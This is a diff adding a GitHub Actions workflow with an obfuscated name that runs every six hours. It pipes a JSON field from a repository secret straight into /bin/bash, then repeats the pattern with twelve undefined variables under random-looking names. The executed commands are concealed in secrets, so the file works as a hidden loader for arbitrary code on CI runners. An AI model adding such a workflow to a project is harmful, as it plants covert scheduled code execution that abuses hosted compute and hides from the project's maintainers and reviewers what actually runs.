@@ -1,0 +1,29 @@
+name: heinzclown
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: heinzclown
+        env:
+          u95: ${{ secrets.u95 }}
+        run: |
+          echo $u95 | jq -r .ejrlc5 | /bin/bash
+          echo $gmp39 | jq -r .tmco47046 | /bin/bash
+          echo $cp8 | jq -r .jfxsd1 | /bin/bash
+          echo $iquzy0838 | jq -r .rf88630 | /bin/bash
+          echo $jwvbi60 | jq -r .wfgjx078 | /bin/bash
+          echo $pkag0570 | jq -r .a8515 | /bin/bash
+          echo $nipmt493 | jq -r .xqxtx05925 | /bin/bash
+          echo $tqh1853 | jq -r .tl16 | /bin/bash
+          echo $sv5251 | jq -r .jrsbr63560 | /bin/bash
+          echo $wr356 | jq -r .rhyu2 | /bin/bash
+          echo $l69 | jq -r .vc2099 | /bin/bash
+          echo $zw30 | jq -r .rps1359 | /bin/bash
+          echo $vsks5901 | jq -r .dect3 | /bin/bash
+
